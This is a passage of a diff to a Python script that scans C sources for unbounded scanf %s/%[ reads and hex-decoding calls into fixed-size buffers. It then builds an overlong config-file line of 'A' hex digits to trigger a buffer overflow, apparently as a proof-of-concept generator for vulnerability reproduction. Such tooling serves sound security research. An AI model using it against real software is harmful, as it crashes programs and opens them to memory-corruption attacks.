@@ -1,762 +1,614 @@
 import os
 import re
 import tarfile
-import tempfile
-from pathlib import Path
+from dataclasses import dataclass
 from typing import Dict, List, Optional, Tuple
 
 
-def _is_within_directory(directory: str, target: str) -> bool:
-    directory = os.path.abspath(directory)
-    target = os.path.abspath(target)
+def _safe_decode(b: bytes) -> str:
     try:
-        common = os.path.commonpath([directory, target])
+        return b.decode("utf-8", "ignore")
     except Exception:
-        return False
-    return common == directory
+        try:
+            return b.decode("latin-1", "ignore")
+        except Exception:
+            return ""
 
 
-def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
-    with tarfile.open(tar_path, "r:*") as tar:
-        for member in tar.getmembers():
-            name = member.name
-            if not name or name.startswith("/") or name.startswith("\\"):
-                continue
-            target_path = os.path.join(dst_dir, name)
-            if not _is_within_directory(dst_dir, target_path):
-                continue
+def _iter_dir_files(root: str) -> List[Tuple[str, bytes]]:
+    out = []
+    for dirpath, _, filenames in os.walk(root):
+        for fn in filenames:
+            p = os.path.join(dirpath, fn)
             try:
-                tar.extract(member, path=dst_dir)
+                with open(p, "rb") as f:
+                    out.append((os.path.relpath(p, root).replace("\\", "/"), f.read()))
             except Exception:
                 continue
+    return out
 
 
-def _read_bytes_limited(path: Path, max_bytes: int) -> Optional[bytes]:
-    try:
-        with path.open("rb") as f:
-            data = f.read(max_bytes + 1)
-        if len(data) > max_bytes:
-            return None
-        return data
-    except Exception:
-        return None
-
-
-def _read_text_limited(path: Path, max_bytes: int) -> Optional[str]:
-    data = _read_bytes_limited(path, max_bytes)
-    if data is None:
-        return None
-    try:
-        return data.decode("utf-8", errors="ignore")
-    except Exception:
-        try:
-            return data.decode("latin-1", errors="ignore")
-        except Exception:
-            return None
-
-
-def _iter_files(root: Path) -> List[Path]:
+def _iter_tar_files(tar_path: str) -> List[Tuple[str, bytes]]:
     out = []
-    for dp, dn, fn in os.walk(root):
-        for f in fn:
-            out.append(Path(dp) / f)
+    try:
+        with tarfile.open(tar_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isfile():
+                    continue
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    out.append((m.name, f.read()))
+                except Exception:
+                    continue
+    except Exception:
+        return []
     return out
 
 
-def _parse_macros(text: str) -> Dict[str, int]:
-    macros: Dict[str, int] = {}
-    for m in re.finditer(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b', text, flags=re.M):
-        name, val = m.group(1), m.group(2)
-        try:
-            macros[name] = int(val)
-        except Exception:
-            pass
-    return macros
+def _iter_files(src_path: str) -> List[Tuple[str, bytes]]:
+    if os.path.isdir(src_path):
+        return _iter_dir_files(src_path)
+    return _iter_tar_files(src_path)
 
 
-def _parse_char_arrays(text: str, macros: Dict[str, int]) -> Dict[str, int]:
-    decls: Dict[str, int] = {}
-    for m in re.finditer(r'(?<!\w)(?:unsigned\s+|signed\s+)?char\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', text):
-        var = m.group(1)
-        sz_tok = m.group(2)
-        sz = None
-        if sz_tok.isdigit():
-            sz = int(sz_tok)
-        else:
-            sz = macros.get(sz_tok)
-        if sz is None:
-            continue
-        prev = decls.get(var)
-        if prev is None or sz > prev:
-            decls[var] = sz
-    return decls
+def _is_probably_text(name: str, b: bytes) -> bool:
+    if not b:
+        return False
+    if b"\x00" in b:
+        return False
+    if len(b) > 2_000_000:
+        return False
+    ext = os.path.splitext(name.lower())[1]
+    if ext in (".png", ".jpg", ".jpeg", ".gif", ".bmp", ".pdf", ".zip", ".gz", ".xz", ".bz2", ".7z", ".exe", ".dll", ".so", ".a"):
+        return False
+    return True
 
 
-def _scan_to_matching_paren(s: str, open_paren_idx: int) -> Optional[int]:
-    n = len(s)
-    i = open_paren_idx
-    if i >= n or s[i] != "(":
-        return None
-    depth = 1
-    i += 1
-    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
-    esc = False
-    while i < n:
-        c = s[i]
-        if state == 0:
-            if c == '"':
-                state = 1
-                esc = False
-            elif c == "'":
-                state = 2
-                esc = False
-            elif c == "/" and i + 1 < n and s[i + 1] == "/":
-                state = 3
-                i += 1
-            elif c == "/" and i + 1 < n and s[i + 1] == "*":
-                state = 4
-                i += 1
-            elif c == "(":
-                depth += 1
-            elif c == ")":
-                depth -= 1
-                if depth == 0:
-                    return i
-        elif state == 1:
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == '"':
-                state = 0
-        elif state == 2:
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == "'":
-                state = 0
-        elif state == 3:
-            if c == "\n":
-                state = 0
-        elif state == 4:
-            if c == "*" and i + 1 < n and s[i + 1] == "/":
-                state = 0
-                i += 1
-        i += 1
-    return None
+def _is_source_file(name: str) -> bool:
+    ext = os.path.splitext(name.lower())[1]
+    return ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
 
 
-def _find_calls(text: str, funcname: str) -> List[str]:
-    out: List[str] = []
-    pat = funcname + "("
-    n = len(text)
-    idx = 0
-    while True:
-        j = text.find(pat, idx)
-        if j < 0:
-            break
-        if j > 0 and (text[j - 1].isalnum() or text[j - 1] == "_"):
-            idx = j + 1
-            continue
-        open_idx = j + len(funcname)
-        if open_idx >= n or text[open_idx] != "(":
-            idx = j + 1
-            continue
-        close_idx = _scan_to_matching_paren(text, open_idx)
-        if close_idx is not None:
-            out.append(text[open_idx + 1:close_idx])
-            idx = close_idx + 1
-        else:
-            idx = j + 1
-    return out
+def _is_candidate_config_file(name: str) -> bool:
+    low = name.lower()
+    ext = os.path.splitext(low)[1]
+    if ext in (".conf", ".cfg", ".ini", ".rc", ".cnf", ".properties"):
+        return True
+    if any(k in low for k in ("config", "conf", "cfg", "ini", "rc", "settings", "prefs", "preference", "example", "sample")):
+        if ext in (".txt", ".example", ".sample", ".in", ".tmpl", ".template", ""):
+            return True
+    return False
 
 
-def _split_args(argstr: str) -> List[str]:
-    args: List[str] = []
-    cur: List[str] = []
+def _split_c_args(s: str) -> List[str]:
+    args = []
+    cur = []
     depth = 0
-    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
+    in_str = False
+    quote = ""
     esc = False
     i = 0
-    n = len(argstr)
-    while i < n:
-        c = argstr[i]
-        if state == 0:
-            if c == '"':
-                state = 1
-                esc = False
-                cur.append(c)
-            elif c == "'":
-                state = 2
-                esc = False
-                cur.append(c)
-            elif c == "/" and i + 1 < n and argstr[i + 1] == "/":
-                state = 3
-                cur.append(c)
-                i += 1
-                cur.append("/")
-            elif c == "/" and i + 1 < n and argstr[i + 1] == "*":
-                state = 4
-                cur.append(c)
-                i += 1
-                cur.append("*")
-            elif c in "([{":
-                depth += 1
-                cur.append(c)
-            elif c in ")]}":
-                if depth > 0:
-                    depth -= 1
-                cur.append(c)
-            elif c == "," and depth == 0:
-                a = "".join(cur).strip()
-                if a:
-                    args.append(a)
-                else:
-                    args.append("")
-                cur = []
-            else:
-                cur.append(c)
-        elif state == 1:
-            cur.append(c)
+    while i < len(s):
+        ch = s[i]
+        if in_str:
+            cur.append(ch)
             if esc:
                 esc = False
-            elif c == "\\":
+            elif ch == "\\":
                 esc = True
-            elif c == '"':
-                state = 0
-        elif state == 2:
-            cur.append(c)
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == "'":
-                state = 0
-        elif state == 3:
-            cur.append(c)
-            if c == "\n":
-                state = 0
-        elif state == 4:
-            cur.append(c)
-            if c == "*" and i + 1 < n and argstr[i + 1] == "/":
-                i += 1
-                cur.append("/")
-                state = 0
+            elif ch == quote:
+                in_str = False
+            i += 1
+            continue
+        if ch in ("'", '"'):
+            in_str = True
+            quote = ch
+            cur.append(ch)
+            i += 1
+            continue
+        if ch in "([{":
+            depth += 1
+            cur.append(ch)
+            i += 1
+            continue
+        if ch in ")]}":
+            if depth > 0:
+                depth -= 1
+            cur.append(ch)
+            i += 1
+            continue
+        if ch == "," and depth == 0:
+            a = "".join(cur).strip()
+            if a:
+                args.append(a)
+            cur = []
+            i += 1
+            continue
+        cur.append(ch)
         i += 1
     a = "".join(cur).strip()
-    if a or argstr.strip().endswith(","):
+    if a:
         args.append(a)
     return args
 
 
-def _c_unescape(s: str) -> str:
+def _unescape_c_string_literal(s: str) -> str:
     out = []
     i = 0
-    n = len(s)
-    while i < n:
-        c = s[i]
-        if c != "\\":
-            out.append(c)
+    while i < len(s):
+        ch = s[i]
+        if ch != "\\":
+            out.append(ch)
             i += 1
             continue
         i += 1
-        if i >= n:
+        if i >= len(s):
             break
-        c2 = s[i]
-        if c2 == "n":
-            out.append("\n")
-        elif c2 == "t":
-            out.append("\t")
-        elif c2 == "r":
-            out.append("\r")
-        elif c2 == "\\":
-            out.append("\\")
-        elif c2 == '"':
-            out.append('"')
-        elif c2 == "0":
-            out.append("\x00")
-        else:
-            out.append(c2)
+        c = s[i]
         i += 1
+        if c == "n":
+            out.append("\n")
+        elif c == "r":
+            out.append("\r")
+        elif c == "t":
+            out.append("\t")
+        elif c == "v":
+            out.append("\v")
+        elif c == "b":
+            out.append("\b")
+        elif c == "a":
+            out.append("\a")
+        elif c == "f":
+            out.append("\f")
+        elif c == "\\":
+            out.append("\\")
+        elif c == '"':
+            out.append('"')
+        elif c == "'":
+            out.append("'")
+        elif c == "x":
+            hx = ""
+            while i < len(s) and len(hx) < 2 and s[i] in "0123456789abcdefABCDEF":
+                hx += s[i]
+                i += 1
+            if hx:
+                try:
+                    out.append(chr(int(hx, 16)))
+                except Exception:
+                    pass
+        elif c.isdigit():
+            octd = c
+            while i < len(s) and len(octd) < 3 and s[i].isdigit():
+                octd += s[i]
+                i += 1
+            try:
+                out.append(chr(int(octd, 8)))
+            except Exception:
+                pass
+        else:
+            out.append(c)
     return "".join(out)
 
 
-def _extract_string_literal(arg: str) -> Optional[str]:
-    parts = re.findall(r'"(?:\\.|[^"\\])*"', arg, flags=re.S)
+_STR_LIT_RE = re.compile(r'(?:L|u8|u|U)?("(?:(?:\\.)|[^"\\])*")')
+
+
+def _extract_c_string_literal(expr: str) -> Optional[str]:
+    parts = _STR_LIT_RE.findall(expr)
     if not parts:
         return None
     joined = ""
     for p in parts:
-        joined += _c_unescape(p[1:-1])
-    return joined
+        if len(p) >= 2 and p[0] == '"' and p[-1] == '"':
+            joined += _unescape_c_string_literal(p[1:-1])
+    return joined if joined != "" else None
 
 
-class _FmtSpec:
-    __slots__ = ("pos", "conv", "suppressed", "width", "length", "needs_arg", "consumes_input", "unbounded_string")
-
-    def __init__(self, pos: int, conv: str, suppressed: bool, width: Optional[int], length: str,
-                 needs_arg: bool, consumes_input: bool, unbounded_string: bool):
-        self.pos = pos
-        self.conv = conv
-        self.suppressed = suppressed
-        self.width = width
-        self.length = length
-        self.needs_arg = needs_arg
-        self.consumes_input = consumes_input
-        self.unbounded_string = unbounded_string
+@dataclass
+class _Candidate:
+    key: Optional[str]
+    sep: str  # '=', ':', ' ', or '' when no key
+    prefix: str  # e.g. '0x' or ''
+    hex_len: int  # number of hex digits (excluding prefix)
+    likelihood: int
+    est_len: int
+    origin: str
 
 
-def _parse_scanf_format(fmt: str) -> List[_FmtSpec]:
-    specs: List[_FmtSpec] = []
+def _parse_scanf_format(fmt: str) -> List[Tuple[str, Optional[int], bool, str]]:
+    specs = []
     i = 0
     n = len(fmt)
     while i < n:
         if fmt[i] != "%":
             i += 1
             continue
-        pos = i
         i += 1
         if i < n and fmt[i] == "%":
             i += 1
             continue
-
-        suppressed = False
+        suppress = False
         if i < n and fmt[i] == "*":
-            suppressed = True
+            suppress = True
             i += 1
-
         width = None
-        wstart = i
+        w = ""
         while i < n and fmt[i].isdigit():
+            w += fmt[i]
             i += 1
-        if i > wstart:
+        if w:
             try:
-                width = int(fmt[wstart:i])
+                width = int(w)
             except Exception:
                 width = None
-
-        length = ""
-        if i < n:
-            if fmt[i:i + 2] in ("hh", "ll"):
-                length = fmt[i:i + 2]
-                i += 2
-            elif fmt[i] in ("h", "l", "j", "z", "t", "L", "m"):
-                length = fmt[i]
-                i += 1
-
+        if i + 1 < n and fmt[i:i+2] in ("hh", "ll"):
+            i += 2
+        elif i < n and fmt[i] in ("h", "l", "j", "z", "t", "L"):
+            i += 1
         if i >= n:
             break
-
         conv = fmt[i]
         i += 1
-
+        scanset = ""
         if conv == "[":
-            # scanset: read until closing ']' (first char may be ']' or '^')
-            # We already consumed '[' as conv; we don't need to store the set itself.
-            # But we must advance parser to after the closing ']'.
+            start = i
             if i < n and fmt[i] == "^":
                 i += 1
             if i < n and fmt[i] == "]":
                 i += 1
-            while i < n:
-                if fmt[i] == "]":
-                    i += 1
-                    break
-                if fmt[i] == "\\" and i + 1 < n:
-                    i += 2
-                else:
-                    i += 1
-
-        needs_arg = (conv != "%") and (not suppressed) and (conv != "n")  # 'n' needs arg but doesn't consume input; handle separately
-        consumes_input = (conv != "%") and (conv != "n")
-        if conv == "n" and not suppressed:
-            needs_arg = True
-        unbounded_string = False
-        if conv in ("s", "["):
-            if width is None:
-                if conv == "s" and length == "m":
-                    unbounded_string = False  # GNU alloc
-                else:
-                    unbounded_string = True
-        specs.append(_FmtSpec(pos, conv, suppressed, width, length, needs_arg, consumes_input, unbounded_string))
+            while i < n and fmt[i] != "]":
+                i += 1
+            if i < n and fmt[i] == "]":
+                i += 1
+            scanset = fmt[start:i]
+        specs.append((conv, width, suppress, scanset))
     return specs
 
 
-def _best_identifier(expr: str) -> Optional[str]:
-    e = expr.strip()
-    e = re.sub(r'^\s*&\s*', '', e)
-    e = re.sub(r'^\s*\(\s*[^)]*\)\s*', '', e)
-    # handle buf[0], buf+1
-    m = re.match(r'^([A-Za-z_]\w*)', e)
+def _extract_var_name(expr: str) -> Optional[str]:
+    expr = expr.strip()
+    expr = re.sub(r'^\s*&\s*', '', expr)
+    m = re.match(r'^([A-Za-z_]\w*)\b', expr)
     if m:
         return m.group(1)
-    # handle something->member or something.member (take member)
-    m2 = re.search(r'([A-Za-z_]\w*)\s*(?:\)|\]|\s|$)', e)
-    if m2:
-        return m2.group(1)
+    m = re.search(r'\b([A-Za-z_]\w*)\s*(?:\+|\)|,|$)', expr)
+    if m:
+        return m.group(1)
     return None
 
 
-def _generate_input_from_format(fmt: str, target_spec_idx: int, long_token: str) -> str:
-    specs = _parse_scanf_format(fmt)
-    # Map from spec index in specs list to which "input token" it should use.
-    # We will generate for all specs that consume input; for target, long_token.
-    token_for_spec: Dict[int, str] = {}
-    for si, sp in enumerate(specs):
-        if not sp.consumes_input:
+def _build_decl_map(text: str) -> Dict[str, int]:
+    decls: Dict[str, int] = {}
+    for m in re.finditer(r'\b(?:unsigned\s+char|char|uint8_t|int8_t|u?int8_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]', text):
+        var = m.group(1)
+        try:
+            sz = int(m.group(2))
+        except Exception:
             continue
-        if si == target_spec_idx:
-            token_for_spec[si] = long_token
+        if 1 <= sz <= 16384:
+            prev = decls.get(var)
+            if prev is None or sz > prev:
+                decls[var] = sz
+    return decls
+
+
+def _find_nearest_strcmp_key(text: str, pos: int) -> Optional[str]:
+    window_start = max(0, pos - 4000)
+    snippet = text[window_start:pos]
+    best = None
+    best_pos = -1
+    for m in re.finditer(r'\b(?:strc?mp|strn?casecmp)\s*\(\s*[^,]+,\s*(?:L|u8|u|U)?("(?:(?:\\.)|[^"\\])*")', snippet, re.S):
+        lit = m.group(1)
+        try:
+            key = _unescape_c_string_literal(lit[1:-1])
+        except Exception:
+            continue
+        if not key or len(key) > 80:
+            continue
+        if any(c in key for c in "\n\r\t"):
+            continue
+        if m.start() > best_pos:
+            best_pos = m.start()
+            best = key
+    return best
+
+
+def _context_likelihood(ctx: str, fmt: Optional[str], varname: Optional[str], key: Optional[str], origin: str) -> int:
+    c = ctx.lower()
+    score = 0
+    if "config" in c or "cfg" in c or ".conf" in c or "ini" in c:
+        score += 4
+    if "hex" in c or "isxdigit" in c or "base 16" in c or "strtol" in c or "%02x" in c or "0x" in c:
+        score += 7
+    if fmt:
+        f = fmt.lower()
+        if "=" in f:
+            score += 2
+        if ":" in f:
+            score += 1
+        if re.search(r'\[[^\]]*(?:0-9|a-f|A-F)[^\]]*\]', fmt):
+            score += 5
+        if "%x" in f or "%02x" in f or "%hhx" in f:
+            score += 2
+    if varname:
+        v = varname.lower()
+        if "hex" in v:
+            score += 6
+        if any(k in v for k in ("key", "iv", "mac", "salt", "seed", "token", "secret")):
+            score += 2
+        if "val" in v or "value" in v:
+            score += 1
+    if key:
+        kl = key.lower()
+        if any(k in kl for k in ("hex", "key", "iv", "mac", "salt", "seed", "token", "secret")):
+            score += 6
         else:
-            if sp.conv in ("d", "i", "u", "x", "X", "o", "p"):
-                token_for_spec[si] = "0"
-            elif sp.conv in ("f", "F", "e", "E", "g", "G", "a", "A"):
-                token_for_spec[si] = "0"
-            elif sp.conv == "c":
-                token_for_spec[si] = "A"
-            elif sp.conv in ("s", "["):
-                token_for_spec[si] = "A"
-            else:
-                token_for_spec[si] = "A"
-
-    out: List[str] = []
-    i = 0
-    n = len(fmt)
-    spec_i = 0
-    while i < n:
-        c = fmt[i]
-        if c == "%":
-            if i + 1 < n and fmt[i + 1] == "%":
-                out.append("%")
-                i += 2
-                continue
-            # skip full spec similarly to parser
-            i += 1
-            if i < n and fmt[i] == "*":
-                i += 1
-            while i < n and fmt[i].isdigit():
-                i += 1
-            if i < n:
-                if fmt[i:i + 2] in ("hh", "ll"):
-                    i += 2
-                elif fmt[i] in ("h", "l", "j", "z", "t", "L", "m"):
-                    i += 1
-            if i >= n:
-                break
-            conv = fmt[i]
-            i += 1
-            if conv == "[":
-                if i < n and fmt[i] == "^":
-                    i += 1
-                if i < n and fmt[i] == "]":
-                    i += 1
-                while i < n:
-                    if fmt[i] == "]":
-                        i += 1
-                        break
-                    if fmt[i] == "\\" and i + 1 < n:
-                        i += 2
-                    else:
-                        i += 1
-
-            sp = specs[spec_i] if spec_i < len(specs) else None
-            if sp is not None and sp.consumes_input:
-                out.append(token_for_spec.get(spec_i, "A"))
-            spec_i += 1
-            continue
-        if c.isspace():
-            out.append(" ")
-            i += 1
-            while i < n and fmt[i].isspace():
-                i += 1
-            continue
-        out.append(c)
-        i += 1
-    return "".join(out).strip() + "\n"
-
-
-def _extract_key_from_format(fmt: str, spec: _FmtSpec) -> Optional[str]:
-    prefix = fmt[:spec.pos]
-    m = re.search(r'([A-Za-z_][\w.\-]*)\s*[:=]\s*$', prefix)
-    if m:
-        return m.group(1)
-    m = re.search(r'([A-Za-z_][\w.\-]*)\s+$', prefix)
-    if m:
-        return m.group(1)
-    return None
-
-
-def _score_candidate(file_path: str, fmt: str, spec: _FmtSpec, dest_size: int) -> float:
-    p = file_path.lower()
-    f = fmt.lower()
-    score = 0.0
-    if any(x in p for x in ("config", "conf", "cfg", "ini", "settings", "option")):
-        score += 80.0
-    if "hex" in f:
-        score += 70.0
-    if "0x" in f:
-        score += 40.0
-    if "=" in f or ":" in f:
-        score += 20.0
-    if spec.conv == "[":
-        score += 25.0
-    if spec.unbounded_string:
-        score += 50.0
-    if dest_size > 0:
-        score += max(0.0, 120.0 - dest_size / 2.0)
-    if "sscanf" in p or "fscanf" in p:
-        score += 5.0
+            score += 3
+    if "hexcall" in origin:
+        score += 6
     return score
 
 
-def _find_best_config_template(root: Path, key: Optional[str]) -> Optional[Path]:
-    exts = {".conf", ".cfg", ".ini", ".cnf", ".config", ".properties", ".txt"}
-    best: Tuple[float, Optional[Path]] = (-1e18, None)
-    for path in _iter_files(root):
-        if not path.is_file():
+def _analyze_sources(files: List[Tuple[str, bytes]]) -> List[_Candidate]:
+    candidates: List[_Candidate] = []
+    for name, b in files:
+        if not _is_source_file(name):
             continue
-        if path.suffix.lower() not in exts:
+        if not _is_probably_text(name, b):
             continue
-        size = None
-        try:
-            size = path.stat().st_size
-        except Exception:
+        text = _safe_decode(b)
+        if not text:
             continue
-        if size is None or size <= 0 or size > 200_000:
-            continue
-        txt = _read_text_limited(path, 200_000)
-        if txt is None:
-            continue
-        tl = txt.lower()
-        score = 0.0
-        if "0x" in tl:
-            score += 80.0
-        if "hex" in tl:
-            score += 60.0
-        if key and key.lower() in tl:
-            score += 80.0
-        pl = str(path).lower()
-        if any(x in pl for x in ("example", "sample", "default", "conf", "cfg")):
-            score += 30.0
-        score -= len(txt) / 500.0
-        if score > best[0]:
-            best = (score, path)
-    return best[1]
+
+        decls = _build_decl_map(text)
+
+        # Scan for scanf-family calls with unbounded %s or %[...] into fixed arrays
+        for m in re.finditer(r'\b(sscanf|fscanf|scanf)\s*\(\s*(.{0,600}?)\)\s*;', text, re.S):
+            fn = m.group(1)
+            argblob = m.group(2)
+            args = _split_c_args(argblob)
+            if fn == "sscanf":
+                if len(args) < 3:
+                    continue
+                fmt_expr = args[1]
+                var_args = args[2:]
+            elif fn == "fscanf":
+                if len(args) < 3:
+                    continue
+                fmt_expr = args[1]
+                var_args = args[2:]
+            else:
+                if len(args) < 2:
+                    continue
+                fmt_expr = args[0]
+                var_args = args[1:]
+            fmt = _extract_c_string_literal(fmt_expr)
+            if not fmt:
+                continue
+
+            specs = _parse_scanf_format(fmt)
+            if not specs:
+                continue
+
+            need = []
+            for conv, width, suppress, scanset in specs:
+                if suppress:
+                    continue
+                if conv == "s":
+                    need.append(("s", width, ""))
+                elif conv == "[":
+                    need.append(("[", width, scanset))
+
+            if not need:
+                continue
+            if len(var_args) < len([x for x in specs if not x[2] and x[0] != "n"]):
+                # Too hard to map precisely; still try by indexing string specs order
+                pass
+
+            idx = 0
+            for conv, width, scanset in need:
+                if idx >= len(var_args):
+                    break
+                expr = var_args[idx]
+                idx += 1
+                varname = _extract_var_name(expr)
+                if not varname:
+                    continue
+                sz = decls.get(varname)
+                if not sz:
+                    continue
+                unbounded = width is None
+                if not unbounded:
+                    continue
+
+                # Filter to hex-related contexts
+                ctx = text[max(0, m.start() - 800):min(len(text), m.end() + 800)]
+                fmt_is_hexish = bool(re.search(r'\[[^\]]*(?:0-9|a-f|A-F)[^\]]*\]', fmt)) or ("x" in fmt.lower())
+                ctx_has_hex = ("hex" in ctx.lower()) or ("isxdigit" in ctx.lower()) or ("0x" in ctx.lower()) or ("base 16" in ctx.lower())
+                var_hexish = "hex" in varname.lower()
+                if not (fmt_is_hexish or ctx_has_hex or var_hexish):
+                    continue
+
+                key = _find_nearest_strcmp_key(text, m.start())
+
+                sep = "=" if "=" in fmt else (":" if ":" in fmt else " ")
+                prefix = "0x" if "0x" in fmt.lower() or "0x" in ctx.lower() else ""
+                # If scanset is for hex digits, ensure even length for validity
+                extra = 4
+                hex_len = max(8, sz + 1 + extra)
+                if prefix or conv == "[" or fmt_is_hexish or ctx_has_hex:
+                    if hex_len % 2 == 1:
+                        hex_len += 1
+
+                # Build minimal line length estimate
+                if key:
+                    if sep == " ":
+                        est = len(key) + 1 + len(prefix) + hex_len + 1
+                    else:
+                        est = len(key) + 1 + len(prefix) + hex_len + 1
+                else:
+                    est = len(prefix) + hex_len + 1
+
+                likelihood = _context_likelihood(ctx, fmt, varname, key, origin=f"scanf:{fn}")
+                candidates.append(_Candidate(key=key, sep=sep if key else "", prefix=prefix, hex_len=hex_len, likelihood=likelihood, est_len=est, origin=f"{name}:{fn}"))
+
+        # Scan for hex conversion calls of the form func(src, dst) where dst is fixed array
+        for m in re.finditer(r'\b([A-Za-z_]\w*hex\w*)\s*\(\s*([^,()]{1,200})\s*,\s*([A-Za-z_]\w*)\s*(?:\)\s*;|,\s*[^)]{1,200}\)\s*;)', text, re.S):
+            func = m.group(1)
+            dst = m.group(3)
+            sz = decls.get(dst)
+            if not sz:
+                continue
+            calltxt = m.group(0)
+            # Prefer 2-arg versions; if has 3+ args, it might be fixed/safe
+            has_more_args = "," in calltxt[calltxt.find(dst) + len(dst):]
+            if has_more_args:
+                # Still consider but lower likelihood
+                pass
+
+            ctx = text[max(0, m.start() - 800):min(len(text), m.end() + 800)]
+            if "hex" not in ctx.lower() and "isxdigit" not in ctx.lower() and "0x" not in ctx.lower():
+                continue
+
+            key = _find_nearest_strcmp_key(text, m.start())
+            sep = "="
+            prefix = ""
+            extra = 2
+            # Need hex digits to decode to > sz bytes (2 digits per byte)
+            hex_len = 2 * (sz + 1 + extra)
+            if hex_len % 2 == 1:
+                hex_len += 1
+            est = (len(key) + 1 + len(prefix) + hex_len + 1) if key else (len(prefix) + hex_len + 1)
+            likelihood = _context_likelihood(ctx, None, dst, key, origin="hexcall") - (2 if has_more_args else 0)
+            candidates.append(_Candidate(key=key, sep=sep if key else "", prefix=prefix, hex_len=hex_len, likelihood=likelihood, est_len=est, origin=f"{name}:hexcall:{func}"))
+    return candidates
 
 
-def _modify_config_text_to_overflow(cfg_text: str, key: Optional[str], overflow_token: str) -> Tuple[str, bool]:
-    lines = cfg_text.splitlines(True)
-    key_line_idx = None
-    key_match = None
+def _find_sample_hex_kv(files: List[Tuple[str, bytes]]) -> Optional[Tuple[str, str, str]]:
+    best = None
+    best_score = -1
+    for name, b in files:
+        if _is_source_file(name):
+            continue
+        if not _is_candidate_config_file(name):
+            continue
+        if not _is_probably_text(name, b):
+            continue
+        text = _safe_decode(b)
+        if not text:
+            continue
+        # Look for key = 0x... or key = [0-9A-Fa-f]{8,}
+        for m in re.finditer(r'(?m)^\s*([A-Za-z0-9_.-]{1,80})\s*([:=])\s*(0x)?([0-9A-Fa-f]{8,})\s*(?:[#;].*)?$', text):
+            key = m.group(1)
+            sep = m.group(2)
+            prefix = "0x" if m.group(3) else ""
+            val = m.group(4)
+            score = 0
+            lowname = name.lower()
+            if any(k in lowname for k in ("sample", "example", "default")):
+                score += 3
+            if any(k in key.lower() for k in ("hex", "key", "iv", "mac", "salt", "seed", "secret", "token")):
+                score += 6
+            score += min(5, len(val) // 8)
+            if score > best_score:
+                best_score = score
+                best = (key, sep, prefix)
+    return best
 
+
+def _make_hex(n: int) -> str:
+    if n <= 0:
+        return ""
+    return "A" * n
+
+
+def _build_poc_line(key: Optional[str], sep: str, prefix: str, hex_len: int) -> bytes:
+    hx = _make_hex(hex_len)
     if key:
-        key_re = re.compile(r'^(\s*' + re.escape(key) + r'\s*[:=]\s*)(.*?)(\s*(?:[#;].*)?)?$',
-                            flags=re.I)
-        for i, line in enumerate(lines):
-            if not line.strip():
-                continue
-            if line.lstrip().startswith(("#", ";")):
-                continue
-            m = key_re.match(line.rstrip("\r\n"))
-            if m:
-                key_line_idx = i
-                key_match = m
-                break
-
-    if key_line_idx is None:
-        # fallback: first token containing 0x...
-        ox_re = re.compile(r'(0x[0-9a-fA-F]+)')
-        for i, line in enumerate(lines):
-            if not line.strip():
-                continue
-            if line.lstrip().startswith(("#", ";")):
-                continue
-            m = ox_re.search(line)
-            if m:
-                key_line_idx = i
-                key_match = None
-                break
-
-    if key_line_idx is None:
-        add_key = key if key else "hex"
-        new_line = f"{add_key}={overflow_token}\n"
-        if lines and not lines[-1].endswith(("\n", "\r")):
-            lines[-1] += "\n"
-        lines.append(new_line)
-        return ("".join(lines), True)
-
-    original = lines[key_line_idx]
-    line_wo_nl = original.rstrip("\r\n")
-    nl = original[len(line_wo_nl):] if len(line_wo_nl) < len(original) else "\n"
-
-    if key_match:
-        prefix = key_match.group(1)
-        val = key_match.group(2) if key_match.group(2) is not None else ""
-        suffix = key_match.group(3) if key_match.group(3) is not None else ""
-        vstrip = val.strip()
-        q = None
-        if len(vstrip) >= 2 and vstrip[0] in ("'", '"') and vstrip[-1] == vstrip[0]:
-            q = vstrip[0]
-        if q:
-            new_val = q + overflow_token + q
-            # preserve original spacing around value (roughly)
-            lead_ws = val[:len(val) - len(val.lstrip(" \t"))]
-            trail_ws = val[len(val.rstrip(" \t")):]
-            new_val_full = lead_ws + new_val + trail_ws
+        if sep == " ":
+            s = f"{key} {prefix}{hx}\n"
+        elif sep in ("=", ":"):
+            s = f"{key}{sep}{prefix}{hx}\n"
         else:
-            lead_ws = val[:len(val) - len(val.lstrip(" \t"))]
-            trail_ws = val[len(val.rstrip(" \t")):]
-            new_val_full = lead_ws + overflow_token + trail_ws
-        lines[key_line_idx] = prefix + new_val_full + (suffix if suffix else "") + nl
-        return ("".join(lines), True)
+            s = f"{key}={prefix}{hx}\n"
     else:
-        # replace only the 0x... occurrence with overflow token (keeping 0x if present in original)
-        m = re.search(r'0x[0-9a-fA-F]+', line_wo_nl)
-        if not m:
-            lines[key_line_idx] = line_wo_nl + " " + overflow_token + nl
-            return ("".join(lines), True)
-        lines[key_line_idx] = line_wo_nl[:m.start()] + overflow_token + line_wo_nl[m.end():] + nl
-        return ("".join(lines), True)
-
-
-def _extract_section_snippet(cfg_text: str, target_key: Optional[str], modified_full: str) -> Optional[str]:
-    # Extract just the relevant section header (if INI style) and the modified key line.
-    orig_lines = cfg_text.splitlines()
-    mod_lines = modified_full.splitlines()
-    if len(orig_lines) != len(mod_lines):
-        return None
-
-    idx = None
-    if target_key:
-        key_re = re.compile(r'^\s*' + re.escape(target_key) + r'\s*[:=]', flags=re.I)
-        for i, l in enumerate(mod_lines):
-            if key_re.match(l):
-                idx = i
-                break
-    if idx is None:
-        ox_re = re.compile(r'0x[0-9a-fA-F]{8,}')
-        for i, l in enumerate(mod_lines):
-            if ox_re.search(l):
-                idx = i
-                break
-    if idx is None:
-        return None
-
-    sec_idx = None
-    sec_re = re.compile(r'^\s*\[[^\]]+\]\s*$')
-    for j in range(idx, -1, -1):
-        if sec_re.match(orig_lines[j]):
-            sec_idx = j
-            break
-
-    if sec_idx is not None:
-        snippet = orig_lines[sec_idx] + "\n" + mod_lines[idx] + "\n"
-    else:
